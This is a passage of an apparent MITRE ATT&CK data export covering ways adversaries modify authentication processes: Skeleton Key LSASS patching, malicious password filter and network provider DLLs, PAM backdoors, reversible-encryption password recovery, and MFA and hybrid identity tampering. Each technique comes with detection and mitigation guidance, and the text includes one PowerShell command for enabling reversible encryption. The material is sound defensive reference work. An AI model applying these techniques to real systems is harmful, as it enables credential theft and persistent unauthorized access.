href=\"https://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Clymb3r Function Hook Passwords Sept 2013)</a>\n\nMonitor for calls to <code>OpenProcess</code> that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll). <a href=\"https://www.secureworks.com/research/skeleton-key-malware-analysis\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Dell Skeleton)</a> \n\nMonitor PAM configuration and module paths (ex: <code>/etc/pam.d/</code>) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.\n\nMonitor for suspicious additions to the /Library/Security/SecurityAgentPlugins directory. <a href=\"https://xorrior.com/persistent-credential-theft/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Xorrior Authorization Plugins)</a>\n\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services. <a href=\"https://technet.microsoft.com/en-us/library/dn487457.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Audit Policy)</a> Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nMonitor property changes in Group Policy that manage authentication mechanisms (i.e. Group Policy Modification). The <code>Store passwords using reversible encryption</code> configuration should be set to Disabled. Additionally, monitor and/or block suspicious command/script execution of <code>-AllowReversiblePasswordEncryption $true</code>, <code>Set-ADUser</code> and <code>Set-ADAccountControl</code>. Finally, monitor Fine-Grained Password Policies and regularly audit user accounts and group settings. <a href=\"https://adsecurity.org/?p=2053\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: dump_pwd_dcsync)</a>","platforms":["IaaS","Identity Provider","Linux","macOS","Network Devices","Office Suite","SaaS","Windows"],"dataSources":["Application Log: Application Log Content","Process: Process Access","Logon Session: Logon Session Creation","Active Directory: Active Directory Object Modification","User Account: User Account Authentication","Process: OS API Execution","Windows Registry: Windows Registry Key Creation","File: File Creation","User Account: User Account Modification","File: File Modification","Module: Module Load","Cloud Service: Cloud Service Modification","Windows Registry: Windows Registry Key Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Ensure that proper policies are implemented to dictate the the secure enrollment and deactivation of authentication mechanisms, such as MFA, for user accounts."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict write access to the <code>/Library/Security/SecurityAgentPlugins</code> directory."},{"id":"M1024","name":"Restrict Registry Permissions","description":"Restrict Registry permissions to disallow the modification of sensitive Registry keys such as <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order</code>."},{"id":"M1025","name":"Privileged Process Integrity","description":"Enabled features, such as Protected Process Light (PPL), for LSA. <a href=\"https://technet.microsoft.com/en-us/library/dn408187.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft LSA)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn487450.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Least Privilege)</a> These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. <a href=\"https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#a-nameesaebmaesae-administrative-forest-design-approach\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Securing Privileged Access)</a>\n\nLimit access to the root account and prevent users from modifying protected components through proper privilege separation (ex SELinux, grsecurity, AppArmor, etc.) and limiting Privilege Escalation opportunities.\n\nLimit on-premises accounts with access to the hybrid identity solution in place. For example, limit Azure AD Global Administrator accounts to only those required, and ensure that these are dedicated cloud-only accounts rather than hybrid ones. <a href=\"https://www.microsoft.com/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MagicWeb)</a>"},{"id":"M1027","name":"Password Policies","description":"Ensure that <code>AllowReversiblePasswordEncryption</code> property is set to disabled unless there are application requirements. <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: store_pwd_rev_enc)</a>"},{"id":"M1028","name":"Operating System Configuration","description":"Ensure only valid password filters are registered. Filter DLLs must be present in Windows installation directory (<code>C:\\Windows\\System32\\</code> by default) of a domain controller and/or local computer with a corresponding entry in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages</code>. \n\nStarting in Windows 11 22H2, the <code>EnableMPRNotifications</code> policy can be disabled through Group Policy or through a configuration service provider to prevent Winlogon from sending credentials to network providers. <a href=\"https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-windowslogon\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: EnableMPRNotifications)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information. MFA can also be used to restrict access to cloud resources and APIs."},{"id":"M1047","name":"Audit","description":"Review authentication logs to ensure that mechanisms such as enforcement of MFA are functioning as intended.\n\nPeriodically review the hybrid identity solution in use for any discrepancies. For example, review all Pass Through Authentication (PTA) agents in the Azure Management Portal to identify any unwanted or unapproved ones. <a href=\"https://www.mandiant.com/resources/detecting-microsoft-365-azure-active-directory-backdoors\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Azure AD Backdoors)</a> If ADFS is in use, review DLLs and executable files in the AD FS and Global Assembly Cache directories to ensure that they are signed by Microsoft. Note that in some cases binaries may be catalog-signed, which may cause the file to appear unsigned when viewing file properties. <a href=\"https://www.microsoft.com/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MagicWeb)</a>\n\nPeriodically review for new and unknown network provider DLLs within the Registry (<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\&lt;NetworkProviderName&gt;\\NetworkProvider\\ProviderPath</code>). Ensure only valid network provider DLLs are registered. The name of these can be found in the Registry key at <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order</code>, and have corresponding service subkey pointing to a DLL at <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentC ontrolSet\\Services\\&lt;NetworkProviderName&gt;\\NetworkProvider</code>."}],"subTechniques":[{"id":"T1556.001","name":"Domain Controller Authentication","description":"Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. \n\nMalware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex: Skeleton Key). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments. <a href=\"https://www.secureworks.com/research/skeleton-key-malware-analysis\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Dell Skeleton)</a>","detection":"Monitor for calls to <code>OpenProcess</code> that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll). <a href=\"https://www.secureworks.com/research/skeleton-key-malware-analysis\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Dell Skeleton)</a>\n\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services. <a href=\"https://technet.microsoft.com/en-us/library/dn487457.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Audit Policy)</a> Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g. a user has an active login session but has not entered the building or does not have VPN access).","platforms":["Windows"],"dataSources":["Logon Session: Logon Session Creation","Process: Process Access","File: File Modification","Process: OS API Execution"],"mitigations":[{"id":"M1017","name":"User Training","description":"Train users to recognize and handle suspicious email attachments. Emphasize the importance of caution when opening attachments from unknown or unexpected sources, even if they appear legitimate. Implement email warning banners to alert users about emails originating from outside the organization or containing attachments, reinforcing awareness and helping users identify potential spearphishing attempts."},{"id":"M1025","name":"Privileged Process Integrity","description":"Enabled features, such as Protected Process Light (PPL), for LSA. <a href=\"https://technet.microsoft.com/en-us/library/dn408187.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft LSA)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn487450.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Least Privilege)</a> These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. <a href=\"https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#a-nameesaebmaesae-administrative-forest-design-approach\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Securing Privileged Access)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information. MFA can also be used to restrict access to cloud resources and APIs."}]},{"id":"T1556.002","name":"Password Filter DLL","description":"Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. \n\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. \n\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made. <a href=\"http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Carnal Ownage Password Filters Sept 2013)</a>","detection":"Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages</code>) and correlate then investigate the DLL files these files reference.\n\nPassword filters will also show up as an autorun and loaded DLL in lsass.exe. <a href=\"https://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Clymb3r Function Hook Passwords Sept 2013)</a>","platforms":["Windows"],"dataSources":["Windows Registry: Windows Registry Key Modification","File: File Creation","Module: Module Load"],"mitigations":[{"id":"M1028","name":"Operating System Configuration","description":"Ensure only valid password filters are registered. Filter DLLs must be present in Windows installation directory (C:\\Windows\\System32\\ by default) of a domain controller and/or local computer with a corresponding entry in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages."}]},{"id":"T1556.003","name":"Pluggable Authentication Modules","description":"Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>. <a href=\"https://opensource.apple.com/source/dovecot/dovecot-239/dovecot/doc/wiki/PasswordDatabase.PAM.txt\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple PAM)</a> <a href=\"https://linux.die.net/man/8/pam_unix\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Man Pam_Unix)</a> <a href=\"https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/managing_smart_cards/pluggable_authentication_modules\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Red Hat PAM)</a>\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials. <a href=\"https://github.com/zephrax/linux-pam-backdoor\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PAM Backdoor)</a>\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords. <a href=\"https://x-c3ll.github.io/posts/PAM-backdoor-DNS/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PAM Creds)</a> <a href=\"https://opensource.apple.com/source/dovecot/dovecot-239/dovecot/doc/wiki/PasswordDatabase.PAM.txt\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple PAM)</a>","detection":"Monitor PAM configuration and module paths (ex: <code>/etc/pam.d/</code>) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.\n\nLook for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times (ex: when the user is not present) or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).","platforms":["Linux","macOS"],"dataSources":["File: File Modification","Logon Session: Logon Session Creation"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Limit access to the root account and prevent users from modifying PAM components through proper privilege separation (ex SELinux, grsecurity, AppArmor, etc.) and limiting Privilege Escalation opportunities."},{"id":"M1032","name":"Multi-factor Authentication","description":"Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information."}]},{"id":"T1556.004","name":"Network Device Authentication","description":"Adversaries may use Patch System Image to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.\n\nModify System Image may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials. <a href=\"https://www.mandiant.com/resources/synful-knock-acis\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant - Synful Knock)</a>","detection":"Consider verifying the checksum of the operating system file and verifying the image of the operating system in memory. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#7\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)</a> <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#13\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)</a>\n\nDetection of this behavior may be difficult, detection efforts may be focused on closely related adversary behaviors, such as Modify System Image.","platforms":["Network Devices"],"dataSources":["File: File Modification"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Restrict administrator accounts to as few individuals as possible, following least privilege principles.  Prevent credential overlap across systems of administrator and privileged accounts, particularly between network and non-network platforms, such as servers or endpoints."},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for user and privileged accounts. Most embedded network devices support TACACS+ and/or RADIUS.  Follow vendor prescribed best practices for hardening access control. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#39\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - TACACS)</a>"}]},{"id":"T1556.005","name":"Reversible Encryption","description":"An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it. <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: store_pwd_rev_enc)</a>\n\nIf the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:\n\n1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code>\n2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code>\n3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)\n4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)\n\nWith this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value. <a href=\"http://blog.teusink.net/2009/08/passwords-stored-using-reversible.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: how_pwd_rev_enc_1)</a> <a href=\"http://blog.teusink.net/2009/08/passwords-stored-using-reversible_26.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: how_pwd_rev_enc_2)</a>\n\nAn adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory PowerShell module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher. <a href=\"https://adsecurity.org/?p=2053\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: dump_pwd_dcsync)</a> In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.","detection":"Monitor property changes in Group Policy: <code>Computer Configuration\\Windows Settings\\Security Settings\\Account Policies\\Password Policy\\Store passwords using reversible encryption</code>. By default, the property should be set to Disabled.\n\nMonitor command-line usage for <code>-AllowReversiblePasswordEncryption $true</code> or other actions that could be related to malicious tampering of user settings (i.e. Group Policy Modification). Furthermore, consider monitoring and/or blocking suspicious execution of Active Directory PowerShell modules, such as <code>Set-ADUser</code> and <code>Set-ADAccountControl</code>, that change account configurations. \n\nMonitor Fine-Grained Password Policies and regularly audit user accounts and group settings. <a href=\"https://adsecurity.org/?p=2053\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: dump_pwd_dcsync)</a>","platforms":["Windows"],"dataSources":["Active Directory: Active Directory Object Modification","Command: Command Execution","User Account: User Account Metadata","Script: Script Execution"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn487450.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Least Privilege)</a> These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. <a href=\"https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#a-nameesaebmaesae-administrative-forest-design-approach\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Securing Privileged Access)</a>"},{"id":"M1027","name":"Password Policies","description":"Ensure that <code>AllowReversiblePasswordEncryption</code> property is set to disabled unless there are application requirements. <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: store_pwd_rev_enc)</a>"}]},{"id":"T1556.006","name":"Multi-Factor Authentication","description":"Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.\n\nOnce adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as Multi-Factor Authentication Request Generation, adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality. <a href=\"https://www.mandiant.com/media/17826\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant APT42)</a> <a href=\"https://docs.microsoft.com/en-us/azure/active-directory/governance/conditional-access-exclusion\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure AD Conditional Access Exclusions)</a>\n\nFor example, modifying the Windows hosts file (<code>C:\\windows\\system32\\drivers\\etc\\hosts</code>) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a \"fail open\" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA. <a href=\"https://www.cisa.gov/uscert/ncas/alerts/aa22-074a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Russians Exploit Default MFA Protocol - CISA March 2022)</a> \n\nDepending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment. <a href=\"https://www.cisa.gov/uscert/ncas/alerts/aa22-074a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Russians Exploit Default MFA Protocol - CISA March 2022)</a>","detection":"","platforms":["IaaS","Identity Provider","Linux","macOS","Office Suite","SaaS","Windows"],"dataSources":["Logon Session: Logon Session Creation","Application Log: Application Log Content","Active Directory: Active Directory Object Modification","User Account: User Account Authentication","User Account: User Account Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Ensure that proper policies are implemented to dictate the secure enrollment and deactivation of MFA for user accounts."},{"id":"M1032","name":"Multi-factor Authentication","description":"Ensure that MFA and MFA policies and requirements are properly implemented for existing and deactivated or dormant accounts and devices. If possible, consider configuring MFA solutions to \"fail closed\" rather than grant access in case of serious errors."},{"id":"M1047","name":"Audit","description":"Review MFA actions alongside authentication logs to ensure that MFA-based logins are functioning as intended. Review user accounts to ensure that all accounts have MFA enabled. <a href=\"https://www.mandiant.com/resources/blog/cloud-bad-log-configurations\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Cloudy Logs 2023)</a>"}]},{"id":"T1556.007","name":"Hybrid Identity","description":"Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  \n\nMany organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Microsoft Entra ID includes three options for synchronizing identities between Active Directory and Entra ID <a href=\"https://learn.microsoft.com/en-us/azure/active-directory/hybrid/choose-ad-authn\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure AD Hybrid Identity)</a>:\n\n* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Entra ID, allowing authentication to Entra ID to take place entirely in the cloud \n* Pass Through Authentication (PTA), in which Entra ID authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory \n* Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Entra ID \n\nAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users’ identity and privileges. \n\nBy modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the <code>AzureADConnectAuthenticationAgentService</code> process that authorizes all attempts to authenticate to Entra ID, as well as records user credentials. <a href=\"https://blog.xpnsec.com/azuread-connect-for-redteam/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure AD Connect for Read Teamers)</a> <a href=\"https://o365blog.com/post/on-prem_admin/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AADInternals Azure AD On-Prem to Cloud)</a> In environments using AD FS, an adversary may edit the <code>Microsoft.IdentityServer.Servicehost</code> configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies. <a href=\"https://www.microsoft.com/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MagicWeb)</a>\n\nIn some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Entra ID tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Entra ID environment as any user. <a href=\"https://www.mandiant.com/resources/detecting-microsoft-365-azure-active-directory-backdoors\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Azure AD Backdoors)</a>","detection":"","platforms":["IaaS","Identity Provider","Office Suite","SaaS","Windows"],"dataSources":["File: File Modification","Module: Module Load","Application Log: Application Log Content","Logon Session: Logon Session Creation"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Limit on-premises accounts with access to the hybrid identity solution in place. For example, limit Entra ID Global Administrator accounts to only those required, and ensure that these are dedicated cloud-only accounts rather than hybrid ones. <a href=\"https://www.microsoft.com/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MagicWeb)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information. MFA can also be used to restrict access to cloud resources and APIs."},{"id":"M1047","name":"Audit","description":"Periodically review the hybrid identity solution in use for any discrepancies. For example, review all PTA agents in the Entra ID Management Portal to identify any unwanted or unapproved ones. <a href=\"https://www.mandiant.com/resources/detecting-microsoft-365-azure-active-directory-backdoors\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Azure AD Backdoors)</a> If ADFS is in use, review DLLs and executable files in the AD FS and Global Assembly Cache directories to ensure that they are signed by Microsoft. Note that in some cases binaries may be catalog-signed, which may cause the file to appear unsigned when viewing file properties. <a href=\"https://www.microsoft.com/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MagicWeb)</a>"}]},{"id":"T1556.008","name":"Network Provider DLL","description":"Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions. <a href=\"https://learn.microsoft.com/en-us/windows/win32/secauthn/network-provider-api\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Network Provider API)</a> During the logon process, Winlogon (the interactive logon module) sends credentials to the local <code>mpnotify.exe</code> process via RPC. The <code>mpnotify.exe</code> process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening. <a href=\"https://www.huntress.com/blog/cleartext-shenanigans-gifting-user-passwords-to-adversaries-with-nppspy\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NPPSPY - Huntress)</a> <a href=\"https://www.youtube.com/watch?v=ggY3srD9dYs\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NPPSPY Video)</a> <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/npapi/nf-npapi-nplogonnotify\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NPLogonNotify)</a> \n\nAdversaries can configure a malicious network provider DLL to receive credentials from <code>mpnotify.exe</code>. <a href=\"https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NPPSPY)</a> Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via the <code>NPLogonNotify()</code> function. <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/npapi/nf-npapi-nplogonnotify\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NPLogonNotify)</a>\n\nAdversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers. <a href=\"https://www.huntress.com/blog/cleartext-shenanigans-gifting-user-passwords-to-adversaries-with-nppspy\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NPPSPY - Huntress)</a>","detection":"","platforms":["Windows"],"dataSources":["Windows Registry: Windows Registry Key Creation","Windows 